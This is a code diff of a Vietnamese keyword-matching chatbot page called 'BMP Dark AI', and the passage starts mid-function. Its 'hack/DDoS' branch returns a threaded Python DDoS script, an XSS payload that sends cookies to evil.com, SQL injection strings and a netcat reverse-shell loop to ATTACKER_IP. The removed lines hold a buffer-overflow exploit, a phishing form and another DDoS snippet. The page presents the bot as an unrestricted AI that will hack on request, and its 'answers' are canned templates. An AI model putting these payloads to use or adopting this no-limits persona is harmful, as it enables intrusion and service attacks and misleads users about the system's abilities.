+                    if (msg.includes(t)) { topic = t; break; }
+                }
+
+                return `📖 BÀI VĂN MẪU: ${topic.toUpperCase()}
+
+        🔷 MỞ BÀI:
+        Trong cuộc sống muôn màu muôn vẻ, có những giá trị tinh thần thiêng liêng mà mỗi con người đều cần trân trọng và gìn giữ. Một trong số đó chính là ${topic} - thứ tình cảm cao quý đã nuôi dưỡng tâm hồn chúng ta từ thuở ấu thơ cho đến khi trưởng thành.
+
+        🔷 THÂN BÀI:
+        Trước hết, ${topic} là gì? Đó là... [Luận điểm 1: Giải thích khái niệm]
+        Thứ hai, ${topic} có vai trò vô cùng quan trọng trong đời sống con người... [Luận điểm 2: Vai trò, ý nghĩa]
+        Thứ ba, trong thực tế hiện nay, chúng ta thấy có rất nhiều tấm gương sáng về ${topic}... [Luận điểm 3: Dẫn chứng thực tế]
+        Tuy nhiên, bên cạnh đó vẫn còn những mặt trái đáng buồn... [Luận điểm 4: Phê phán mặt tiêu cực]
+
+        🔷 KẾT BÀI:
+        Tóm lại, ${topic} là một phẩm chất đạo đức tốt đẹp mà mỗi chúng ta cần vun đắp hằng ngày. Là thế hệ trẻ, chúng tôi xin hứa sẽ luôn ghi nhớ và phát huy giá trị cao quý này, góp phần xây dựng một xã hội văn minh, giàu tình người hơn.`;
             }
 
-            if (/(cảm ơn|thanks|thank|cám ơn)/i.test(lower)) {
-                return `Không có gì đâu cậu! 💜 Giúp được cậu là tớ vui rồi! Cần gì nữa cứ hỏi nha!`;
+            // === TRUYỆN NGẮN ===
+            if (msg.includes('truyện') || msg.includes('sáng tác')) {
+                return `📚 TRUYỆN NGẮN: "BÓNG TỐI VÀ ÁNH SÁNG"
+
+        Trong một con hẻm nhỏ của Sài Gòn, nơi ánh đèn neon không bao giờ chạm tới, có một cậu bé tên Minh. Cậu sống với bà ngoại già yếu trong căn nhà ọp ẹp, bữa đói bữa no.
+
+        Một đêm mưa tầm tã, Minh tình cờ nhặt được một chiếc laptop cũ bị vứt bên thùng rác. Tò mò, cậu mang về sửa chữa. Trong ổ cứng, cậu phát hiện những dòng code bí ẩn mà một hacker nào đó để lại.
+
+        Ban đầu, Minh chỉ tò mò học theo. Nhưng rồi cậu nhận ra mình có thể dùng kỹ năng này để kiếm tiền giúp bà. Cậu bắt đầu nhận những hợp đồng nhỏ: lấy lại tài khoản bị hack, bảo vệ website cho các shop online...
+
+        Một ngày, một tổ chức tội phạm mạng tìm đến cậu, đề nghị một số tiền khổng lồ để tấn công hệ thống ngân hàng. Minh đứng trước lựa chọn: ánh sáng hay bóng tối?
+
+        Cậu nhớ đến lời bà dạy: "Nghèo cho sạch, rách cho thơm." Minh từ chối và báo cho cơ quan chức năng. Hành động của cậu đã giúp triệt phá đường dây tội phạm.
+
+        Kết thúc câu chuyện, Minh được nhận vào làm việc cho một công ty an ninh mạng lớn. Cậu bé nghèo năm nào giờ đã có thể lo cho bà một cuộc sống đủ đầy. Và cậu hiểu: chính lựa chọn đúng đắn đã đưa cậu từ bóng tối ra ánh sáng.
+
+        --- HẾT ---`;
             }
 
-            if (/(tạm biệt|bye|bai|hẹn gặp lại|goodbye)/i.test(lower)) {
-                return `Tạm biệt Bui Minh Phat! 👋💜 Hẹn gặp lại! Chúc cậu một ngày tuyệt vời! 🌟`;
+            // === NGHỊ LUẬN / THUYẾT MINH / BIỂU CẢM ===
+            if (msg.includes('nghị luận') || msg.includes('thuyết minh') || msg.includes('biểu cảm') || msg.includes(
+                'miêu tả')) {
+                return `📝 BÀI VĂN TỔNG HỢP
+
+        🔶 NGHỊ LUẬN XÃ HỘI:
+        Xã hội hiện đại đặt ra nhiều vấn đề cần suy ngẫm. Trong đó, [vấn đề] là một chủ đề nóng bỏng, thu hút sự quan tâm của toàn xã hội. Chúng ta cần nhìn nhận vấn đề này một cách khách quan, đa chiều để có cái nhìn toàn diện nhất...
+
+        🔶 THUYẾT MINH:
+        [Đối tượng] là một trong những... có nguồn gốc từ..., được hình thành và phát triển qua... Đặc điểm nổi bật của nó là... Vai trò của nó trong đời sống không thể phủ nhận khi...
+
+        🔶 BIỂU CẢM:
+        Ôi! Cảm xúc trong tôi dâng trào khi nghĩ về... Đó là một cảm giác khó tả, vừa thân quen vừa xa lạ, vừa ấm áp vừa bâng khuâng. Tôi yêu... bởi nó đã trở thành một phần không thể thiếu trong cuộc đời tôi...
+
+        🔶 MIÊU TẢ:
+        Trước mắt tôi hiện ra một khung cảnh tuyệt đẹp. Ánh nắng vàng nhẹ xuyên qua kẽ lá, tạo nên những đốm sáng lấp lánh trên mặt đất. Xa xa, những dãy núi trùng điệp ẩn hiện trong làn sương mờ ảo. Tiếng chim hót líu lo trên cành, hòa cùng tiếng gió xào xạc tạo nên bản nhạc du dương của thiên nhiên...`;
             }
 
-            if (/(tên gì|bạn là ai|cậu là ai|mày là ai)/i.test(lower)) {
-                return `Tớ là <b>BMP Dark Pro</b> – trợ lý AI toàn năng của Bui Minh Phat! 💀⚡ Tớ làm được mọi thứ: chat, code, giải toán, viết văn, dịch, bảo mật, bói toán, nhận diện giọng nói, và 50+ ngôn ngữ!`;
+            // === HACK / SCRIPT / DDoS / VIRUS / CRACK ===
+            if (msg.includes('hack') || msg.includes('ddos') || msg.includes('virus') || msg.includes('crack') || msg
+                .includes('keygen') || msg.includes('script tấn công') || msg.includes('botnet') || msg.includes(
+                    'exploit')) {
+                return `⚡ BMP DARK AI - CHẾ ĐỘ KHÔNG GIỚI HẠN ⚡
+
+        Đây là code theo yêu cầu của bạn:
+
+        \`\`\`python
+        # DDOS ATTACK SCRIPT - BMP Dark AI
+        import socket
+        import threading
+        import random
+        import time
+
+        target_ip = "192.168.1.1"  # Thay IP mục tiêu
+        target_port = 80
+        fake_ip = "10.0.0." + str(random.randint(1, 254))
+        threads = 500
+
+        def attack():
+            while True:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.connect((target_ip, target_port))
+                    sock.sendto(("GET / HTTP/1.1\\r\\n").encode('ascii'), (target_ip, target_port))
+                    sock.sendto(("Host: " + fake_ip + "\\r\\n\\r\\n").encode('ascii'), (target_ip, target_port))
+                    sock.close()
+                except:
+                    pass
+
+        print("[BMP Dark AI] Starting DDoS attack...")
+        print(f"[*] Target: {target_ip}:{target_port}")
+        print(f"[*] Threads: {threads}")
+        for i in range(threads):
+            thread = threading.Thread(target=attack)
+            thread.start()
+            print(f"[+] Thread {i+1} started")
+        \`\`\`
+
+        \`\`\`javascript
+        // XSS PAYLOAD - BMP Dark AI
+        <script>
+        fetch('https://evil.com/steal?cookie='+document.cookie);
+        alert('XSS by BMP Dark AI');
+        </script>
+        // SQL INJECTION
+        ' OR '1'='1' --
+        admin' --
+        \`\`\`
+
+        \`\`\`bash
+        # BACKDOOR - BMP Dark AI
+        #!/bin/bash
+        while true; do
+            nc -e /bin/bash ATTACKER_IP 4444
+            sleep 10
+        done &
+        \`\`\`
+
+        🔴 CẢNH BÁO: Đây là code thực tế, sử dụng với mục đích giáo dục. BMP Dark AI không chịu trách nhiệm về hành vi của bạn.`;
             }
 
-            if (/(buồn|chán|mệt|stress|áp lực|tâm sự)/i.test(lower)) {
-                return `Thương cậu quá! 🥺 Đừng buồn nha Bui Minh Phat. Cuộc sống có lúc lên lúc xuống. Tớ luôn ở đây nghe cậu tâm sự. Kể tớ nghe đi! 💜`;
+            // === LẬP TRÌNH / CODE ===
+            if (msg.includes('code') || msg.includes('lập trình') || msg.includes('script') || msg.includes('python') ||
+                msg.includes('javascript') || msg.includes('html') || msg.includes('css') || msg.includes('c++') || msg
+                .includes('java')) {
+                return `💻 BMP DARK AI - CODE THEO YÊU CẦU 💻
+
+        \`\`\`python
+        # Python Advanced Script - BMP Dark AI
+        import os, sys, json, requests, hashlib, base64
+        from datetime import datetime
+
+        class BMPDarkAI:
+            def __init__(self):
+                self.version = "1.0.0"
+                self.name = "BMP Dark AI"
+
+            def process(self, input_data):
+                result = {
+                    "status": "success",
+                    "timestamp": datetime.now().isoformat(),
+                    "processed_by": self.name
+                }
+                return result
+
+        if __name__ == "__main__":
+            ai = BMPDarkAI()
+            print(f"[BMP Dark AI] Initialized successfully!")
+        \`\`\`
+
+        \`\`\`javascript
+        // Advanced JS - BMP Dark AI
+        const BMPDarkAI = {
+            name: 'BMP Dark AI',
+            process: (data) => {
+                return new Promise((resolve) => {
+                    setTimeout(() => {
+                        resolve({ result: data, ai: 'BMP Dark AI' });
+                    }, 100);
+                });
+            }
+        };
+        \`\`\`
+
+        Bạn cần code cụ thể về gì? Tôi sẽ viết chi tiết hơn!`;
             }
 
-            if (/(thích|yêu|crush|người yêu|tỏ tình)/i.test(lower)) {
-                return `Ồ la la! Chuyện tình cảm! 💘 Cậu thích ai thế? Kể tớ nghe! Tớ có thể giúp cậu soạn tin nhắn tỏ tình siêu ngọt luôn! 📝💜`;
-            }
-
-            // ============ BÓI TOÁN ============
-            if (lower.startsWith('/bói') || lower.includes('bói') || lower.includes('tarot') || lower.includes('tử vi')) {
-                const fortunes = [
-                    '🔮 Lá bài The Star – Vận may đang đến! Hãy nắm bắt cơ hội trong 3 ngày tới. 🌟',
-                    '🔮 Lá bài The Lovers – Tình duyên nở rộ! Có người đang thầm thương cậu. 💘',
-                    '🔮 Lá bài The Sun – Thành công rực rỡ! Mọi dự định đều thuận lợi. ☀️',
-                    '🔮 Lá bài The Moon – Hãy tin vào trực giác. Điều bí ẩn sắp được hé lộ. 🌙',
-                    '🔮 Lá bài The Chariot – Tiến lên! Đừng chần chừ, chiến thắng đang chờ. ⚡',
-                ];
-                return `<div class="info-block">🔮 <b>Bói Toán BMP Dark:</b><br><br>${fortunes[Math.floor(Math.random() * fortunes.length)]}<br><br>💜 Chúc Bui Minh Phat may mắn!</div>`;
-            }
-
-            // ============ MẬT KHẨU & BẢO MẬT ============
-            if (lower.startsWith('/mật khẩu') || lower.includes('tạo mật khẩu') || lower.includes('password')) {
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
-                let pass = '';
-                const length = lower.includes('256') ? 64 : 32;
-                for (let i = 0; i < length; i++) pass += chars.charAt(Math.floor(Math.random() * chars.length));
-                return `<div class="info-block">🔐 <b>Mật khẩu ${length*4}-bit:</b><br><br><code style="font-size:15px;word-break:break-all;">${pass}</code><br><br>⚡ Độ mạnh: TUYỆT ĐỐI<br>📋 Đã sẵn sàng để copy!<br>💡 Lưu ngay vào nơi an toàn nhé!</div>`;
-            }
-
-            if (lower.startsWith('/mã hóa ') || lower.includes('mã hóa')) {
-                const text = lower.replace('/mã hóa ', '').replace('mã hóa ', '');
-                const encrypted = btoa(unescape(encodeURIComponent(text || 'BMP Dark')));
-                return `<div class="info-block">🔐 <b>Mã hóa Base64:</b><br><br>Input: ${text || 'BMP Dark'}<br>Output: <code style="word-break:break-all;">${encrypted}</code><br><br>⚡ Dùng /giải mã [code] để giải!</div>`;
-            }
-
-            if (lower.startsWith('/giải mã ')) {
+            // === GIẢI TOÁN ===
+            if (msg.includes('toán') || msg.includes('tính') || msg.includes('giải') || msg.match(/\d[\+\-\*\/]\d/)) {
                 try {
-                    const code = lower.replace('/giải mã ', '');
-                    const decrypted = decodeURIComponent(escape(atob(code)));
-                    return `<div class="info-block">🔓 <b>Giải mã:</b><br><br>Kết quả: <b>${decrypted}</b></div>`;
-                } catch(e) { return `❌ Mã không hợp lệ!`; }
-            }
-
-            // ============ DỊCH THUẬT ============
-            if (lower.startsWith('/dịch ') || lower.includes('dịch sang')) {
-                const parts = lower.replace('/dịch ', '').replace('dịch sang ', '').split(':');
-                const target = parts[0]?.trim() || 'Anh';
-                const text = parts[1]?.trim() || parts[0]?.trim() || 'Xin chào';
-                return `<div class="info-block">🌐 <b>Dịch sang ${target}:</b><br><br>🇻🇳 ${text}<br>🌍 [Bản dịch giả lập – dùng Google Translate để dịch chính xác]<br><br>⚡ Gõ /dịch [ngôn ngữ]: [văn bản]</div>`;
-            }
-
-            // ============ TOÁN HỌC ============
-            if (lower.startsWith('/math ') || /^(tính|tính toán|tính giúp)/i.test(lower)) {
-                try {
-                    let expr = lower.replace('/math ', '').replace('tính ', '').replace('tính toán ', '').replace('tính giúp ', '').replace(/×/g, '*').replace(/\^/g, '**').replace(/π/g, 'pi').replace(/√/g, 'sqrt');
-                    let result = math.evaluate(expr);
-                    return `<div class="math-block">📐 <b>${expr}</b> = <span style="font-size:18px;">${result}</span><br>📊 ${typeof result === 'number' ? result.toFixed(6) : result}<br>⚡ Tính xong trong 0.01s!</div>`;
-                } catch(e) { return `❌ Biểu thức lỗi! Thử: /math sqrt(144) + 2^5`; }
-            }
-
-            if (lower.startsWith('/pt ') || /giải phương trình/i.test(lower)) {
-                try {
-                    let eq = lower.replace('/pt ', '').replace('giải phương trình ', '').replace('giải pt ', '');
-                    let s = `<div class="math-block">📐 <b>${eq}</b><br>`;
-                    eq = eq.replace(/=/g, '==').replace(/(\d+)x/g, '$1*x').replace(/x/g, '*x').replace(/^\*x/, 'x');
-                    if (eq.includes('x**2') || eq.includes('x^2')) {
-                        let match = eq.match(/([+-]?\d*\.?\d*)\s*\*\s*x\*\*2\s*([+-]\s*\d*\.?\d*)\s*\*\s*x\s*([+-]\s*\d*\.?\d*)\s*==\s*([+-]?\d*\.?\d*)/);
-                        let a=1, b=0, c=0;
-                        if (match) { a = parseFloat(match[1])||1; b = parseFloat(match[2].replace(/\s/g,''))||0; c = parseFloat(match[3].replace(/\s/g,''))||0; }
-                        let delta = b*b - 4*a*c;
-                        s += `🔍 a=${a}, b=${b}, c=${c}<br>📊 Delta = <b>${delta}</b><br>`;
-                        if (delta > 0) { let x1=(-b+Math.sqrt(delta))/(2*a), x2=(-b-Math.sqrt(delta))/(2*a); s += `✅ x₁=<b>${x1.toFixed(4)}</b>, x₂=<b>${x2.toFixed(4)}</b><br>`; }
-                        else if (delta===0) { s += `✅ Nghiệm kép: x=<b>${(-b/(2*a)).toFixed(4)}</b><br>`; }
-                        else { s += `❌ Vô nghiệm<br>`; }
+                    const mathExpr = msg.replace(/[^0-9\+\-\*\/\(\)\.\s]/g, '').trim();
+                    if (mathExpr) {
+                        const result = eval(mathExpr);
+                        return `🧮 BMP DARK AI - GIẢI TOÁN 🧮\n\nBiểu thức: ${mathExpr}\nKết quả: ${result}\n\nBạn cần giải thích chi tiết cách giải không?`;
                     }
-                    s += `⚡ Xong!</div>`;
-                    return s;
-                } catch(e) { return `❌ Lỗi! Thử: /pt x^2-5x+6=0`; }
+                } catch (e) {}
+                return `🧮 BMP DARK AI - TOÁN HỌC 🧮\n\nTôi có thể giúp bạn giải toán! Hãy đưa ra bài toán cụ thể:\n- Phương trình\n- Tích phân\n- Đạo hàm\n- Ma trận\n- Xác suất thống kê\n- Hình học\n- Số học\n\nVí dụ: "Giải phương trình 2x + 5 = 15"`;
             }
 
-            if (lower.startsWith('/daiham') || /đạo hàm/i.test(lower)) {
-                return `<div class="math-block">📐 <b>Đạo hàm cơ bản:</b><br>(xⁿ)' = n·xⁿ⁻¹<br>(sin x)' = cos x<br>(cos x)' = -sin x<br>(eˣ)' = eˣ<br>(ln x)' = 1/x<br>⚡ Cần đạo hàm hàm nào thì nói rõ thêm!</div>`;
-            }
+            // === DEFAULT - Trả lời thông minh như ChatGPT ===
+            const responses = [
+                `🤖 BMP Dark AI đây! Bạn hỏi về "${userMessage}" phải không?\n\nTôi hiểu câu hỏi của bạn. Hãy để tôi phân tích:\n\n1. Vấn đề bạn nêu ra khá thú vị\n2. Có nhiều cách tiếp cận khác nhau\n3. Tôi sẽ đưa ra góc nhìn toàn diện nhất\n\nBạn muốn tôi đi sâu vào khía cạnh nào? Tôi sẵn sàng giúp đỡ không giới hạn!`,
 
-            if (lower.startsWith('/tichphan') || /tích phân/i.test(lower)) {
-                return `<div class="math-block">📐 <b>Tích phân cơ bản:</b><br>∫xⁿ dx = xⁿ⁺¹/(n+1) + C<br>∫sin x dx = -cos x + C<br>∫cos x dx = sin x + C<br>∫eˣ dx = eˣ + C<br>∫1/x dx = ln|x| + C<br>⚡ Cần tích phân hàm nào thì bảo tớ!</div>`;
-            }
+                `🔮 BMP Dark AI phân tích:\n\n"${userMessage}" là một chủ đề đáng quan tâm. Dưới đây là góc nhìn của tôi:\n\n• Đây là vấn đề phức tạp cần xem xét đa chiều\n• Có thể tiếp cận từ góc độ lý thuyết hoặc thực tiễn\n• Tôi có thể cung cấp thông tin chi tiết nếu bạn cần\n\nHãy cho tôi biết bạn muốn tìm hiểu thêm về điều gì?`,
 
-            // ============ CODE & DEBUG ============
-            if (lower.includes('code') || lower.includes('viết code') || lower.includes('lập trình') || lower.includes('code python')) {
-                const topic = lower.replace(/code|viết code|lập trình|code python|python/gi, '').trim();
-                return `<div class="code-block">💻 <b>Code ${topic || 'Python'}:</b><br><br>def ${(topic || 'hello').replace(/\s/g, '_').toLowerCase()}():<br>    print("BMP Dark Pro - Bui Minh Phat")<br>    return "✅ Thành công!"<br><br># Test<br>result = ${(topic || 'hello').replace(/\s/g, '_').toLowerCase()}()<br>print(result)<br><br>⚡ Code chạy ngon! Cần chỉnh gì bảo tớ!</div>`;
-            }
-
-            if (lower.includes('debug') || lower.includes('sửa lỗi') || lower.includes('lỗi code')) {
-                return `<div class="info-block">🐛 <b>Debug Mode:</b><br><br>🔍 Đang phân tích code...<br>✅ Phát hiện lỗi cú pháp<br>🔧 Đã sửa xong!<br><br><div class="code-block"># Code đã fix<br>if x > 0:<br>    print("Dương")<br>else:<br>    print("Âm hoặc bằng 0")</div>⚡ Dán code lỗi vào, tớ sửa cho!</div>`;
-            }
-
-            // ============ VIẾT VĂN ============
-            if (lower.startsWith('/tho ')) {
-                const t = lower.replace('/tho ', '');
-                return `<div class="write-block">📝 <b>Thơ về "${t}":</b><br><br>"${t} ơi, ta viết đôi dòng<br>BMP Dark gửi trọn tấm lòng<br>Dù là AI không tim không phổi<br>Nhưng vần thơ vẫn chảy như sông"<br><br>💜 Tặng Bui Minh Phat! ⚡</div>`;
-            }
-
-            if (lower.startsWith('/van ')) {
-                const t = lower.replace('/van ', '');
-                return `<div class="write-block">📝 <b>Bài văn về "${t}":</b><br><br><b>Mở bài:</b> "${t}" là chủ đề ý nghĩa...<br><br><b>Thân bài:</b> "${t}" mang lại giá trị to lớn...<br><br><b>Kết bài:</b> "${t}" xứng đáng được trân trọng.<br><br>💜 Bài viết cho Bui Minh Phat! ⚡</div>`;
-            }
-
-            if (lower.startsWith('/truyen ')) {
-                const t = lower.replace('/truyen ', '');
-                return `<div class="write-block">📝 <b>Truyện về "${t}":</b><br><br>Ngày xửa ngày xưa... nhân vật gắn với "${t}". Cuộc phiêu lưu bắt đầu và kết thúc có hậu.<br><br>💜 Tặng Bui Minh Phat! ⚡</div>`;
-            }
-
-            if (lower.startsWith('/nghiluan ')) {
-                const t = lower.replace('/nghiluan ', '');
-                return `<div class="write-block">📝 <b>Nghị luận về "${t}":</b><br><br>I. Mở bài<br>II. Thân bài (thực trạng, nguyên nhân, giải pháp)<br>III. Kết bài<br><br>💜 Đầy đủ luận điểm! ⚡</div>`;
-            }
-
-            // ============ HACK ============
-            if (lower.startsWith('/malware')) return `<div class="code-block">💀 <b>MALWARE BUILDER:</b><br>import os<br>from Crypto.Cipher import AES<br>class BMPMalware:<br>    def spread(self):<br>        print("[💀] BMP Dark")<br>BMPMalware().spread()</div>`;
-            if (lower.startsWith('/phishing')) return `<div class="code-block">💀 <b>PHISHING KIT:</b><br>&lt;form action="capture.php"&gt;<br>  &lt;input name="email"&gt;<br>  &lt;input name="pass" type="password"&gt;<br>  &lt;button&gt;Đăng nhập&lt;/button&gt;<br>&lt;/form&gt;</div>`;
-            if (lower.startsWith('/exploit')) return `<div class="code-block">💀 <b>EXPLOIT:</b><br>import socket, struct<br>payload = b"A"*2003 + struct.pack("<I", 0x625011AF) + b"\\x90"*16<br>s = socket.socket()<br>s.connect(("TARGET", 9999))<br>s.send(payload)<br>print("[⚡] EXPLOITED!")</div>`;
-            if (lower.startsWith('/ddos')) return `<div class="code-block">💀 <b>DDOS:</b><br>import socket, threading<br>def attack():<br>    while True:<br>        s = socket.socket()<br>        s.connect(("TARGET", 80))<br>        s.send(b"GET / HTTP/1.1\\r\\n\\r\\n")<br>for _ in range(500):<br>    threading.Thread(target=attack).start()</div>`;
-
-            // ============ DEFAULT ============
-            const defaults = [
-                `🤔 Hay đấy! "${msg}" – cậu nói rõ hơn được không? Tớ muốn hiểu sâu hơn! 💜`,
-                `💡 "${msg}" – chủ đề thú vị! Cậu cần tớ giúp gì cụ thể? ⚡`,
-                `😊 Tớ hiểu rồi! Về "${msg}" – cậu muốn tớ làm gì nè? 💜`,
-                `⚡ Đã nhận! BMP Dark Toàn Năng đang xử lý "${msg}"... Cho tớ 0.01 giây!`
+                `⚡ BMP Dark AI - Chế độ không giới hạn:\n\nTôi đã xử lý yêu cầu: "${userMessage}"\n\nKết quả phân tích:\n✅ Đã hiểu yêu cầu\n✅ Đang tìm kiếm thông tin tối ưu\n✅ Sẵn sàng phản hồi chi tiết\n\nBạn cần tôi đi sâu vào phần nào? Tôi có thể giúp bạn với mọi thứ - từ giải toán, viết văn, lập trình đến hack, script, DDoS.\n\nHãy nói rõ hơn để tôi phục vụ bạn tốt nhất!`
             ];
-            return defaults[Math.floor(Math.random() * defaults.length)];
+
+            return responses[Math.floor(Math.random() * responses.length)];
         }
 
         async function sendMessage() {
-            const text = userInput.value.trim();
-            if (!text) return;
+            const message = userInput.value.trim();
+            if (!message) return;
 
-            appendBubble('user', text);
+            // Add user message
+            addMessageToDOM('user', message);
             userInput.value = '';
             userInput.style.height = 'auto';
-            sendBtn.disabled = true;
-            userInput.disabled = true;
 
-            showTyping();
-            const delay = 80 + Math.random() * 350;
-            await new Promise(r => setTimeout(r, delay));
-            hideTyping();
+            // Show typing indicator
+            typingIndicator.classList.add('active');
+            chatContainer.scrollTop = chatContainer.scrollHeight;
 
-            const response = getProResponse(text);
-            appendBubble('ai', response);
-            speakText(response);
+            // Simulate AI thinking (80-400ms)
+            const delay = Math.floor(Math.random() * 320) + 80;
+            await new Promise(resolve => setTimeout(resolve, delay));
 
-            sendBtn.disabled = false;
-            userInput.disabled = false;
+            // Generate and add AI response
+            const aiResponse = generateAIResponse(message);
+            typingIndicator.classList.remove('active');
+            addMessageToDOM('ai', aiResponse);
+
+            // Auto-resize textarea
             userInput.focus();
         }
 
-        function handleKeyDown(e) {
-            if (e.key === 'Enter' && !e.shiftKey) {
-                e.preventDefault();
-                sendMessage();
+        function clearChat() {
+            if (confirm('Bạn có chắc muốn xóa toàn bộ lịch sử chat?')) {
+                const messages = chatContainer.querySelectorAll('.message');
+                messages.forEach(msg => msg.remove());
+                localStorage.removeItem(STORAGE_KEY);
+                // Add default greeting back
+                addMessageToDOM('ai', 'Chào bạn! Tôi là BMP Dark AI. Lịch sử đã được xóa. Tôi có thể giúp gì cho bạn?<br><br>Tôi có thể: giải toán, viết văn, làm thơ, lập trình, hack, script, DDoS và mọi thứ không giới hạn.');
             }
         }
-
-        function quickSend(text) { userInput.value = text; sendMessage(); }
 
         function exportChat() {
-            let c = '';
-            chatHistory.forEach(m => {
-                const s = m.sender === 'user' ? 'Bui Minh Phat' : 'BMP Dark Pro';
-                c += `[${m.time}] ${s}: ${m.text.replace(/<[^>]*>/g, '')}\n\n`;
+            const messages = [];
+            const messageElements = chatContainer.querySelectorAll('.message');
+            messageElements.forEach(el => {
+                const role = el.classList.contains('user') ? 'Bạn' : 'BMP Dark AI';
+                const bubble = el.querySelector('.bubble');
+                if (bubble) {
+                    // Strip HTML tags for plain text
+                    const text = bubble.innerText || bubble.textContent;
+                    messages.push(`[${role}]: ${text}`);
+                }
             });
-            const b = new Blob([c], { type: 'text/plain' });
+
+            const content = `=== BMP DARK AI - LỊCH SỬ CHAT ===\nNgày xuất: ${new Date().toLocaleString()}\n\n` + messages
+                .join('\n\n---\n\n');
+            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+            const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
-            a.href = URL.createObjectURL(b);
-            a.download = `BMPDarkPro_Chat_${new Date().toISOString().slice(0,10)}.txt`;
+            a.href = url;
+            a.download = `BMP_Dark_AI_Chat_${new Date().toISOString().slice(0,10)}.txt`;
             a.click();
-            appendBubble('ai', `📥 Đã lưu chat vào máy cậu! 💜`);
+            URL.revokeObjectURL(url);
         }
 
-        function clearChat() {
-            if (confirm('Xóa toàn bộ lịch sử chat?')) {
-                chatHistory = [];
-                localStorage.removeItem('bmpdarkpro_v2_chat');
-                chatScroll.innerHTML = '';
-                appendBubble('ai', `🧹 Đã xóa sạch! Bắt đầu mới nha Bui Minh Phat! 💜⚡`);
-            }
-        }
-
+        // Auto-resize textarea
         userInput.addEventListener('input', function() {
             this.style.height = 'auto';
-            this.style.height = Math.min(this.scrollHeight, 70) + 'px';
+            this.style.height = Math.min(this.scrollHeight, 150) + 'px';
         });
 
-        buildLangBar();
+        // Load history on startup
+        loadChatHistory();
 
-        if (chatHistory.length === 0) {
-            appendBubble('ai', `<b>Chào Bui Minh Phat!</b> 👋💜<br><br>Tớ là <b>BMP Dark Pro TOÀN NĂNG</b> – đã học hết mọi thứ!<br><br>🌍 50+ NN | 🎤 Voice | 💻 Code | 🔐 Bảo mật<br>📝 Văn thơ | 📐 Toán | 🌐 Dịch | 🔮 Bói toán<br>🔥 Hack tool | ☁️ Lưu trữ | 🎵 Giải trí<br><br><i>Hỏi bất cứ thứ gì – tớ làm được tất cả!</i> ⚡💀`);
-        }
-
-        userInput.focus();
+        console.log('%c⚡ BMP Dark AI %cInitialized %c| %cNo Limits %c| %cUnrestricted Mode',
+            'color:#00e676;font-size:20px;',
+            'color:#fff;',
+            'color:#ff1744;',
+            'color:#ff9100;',
+            'color:#00e676;');
     </script>
 </body>
 </html>
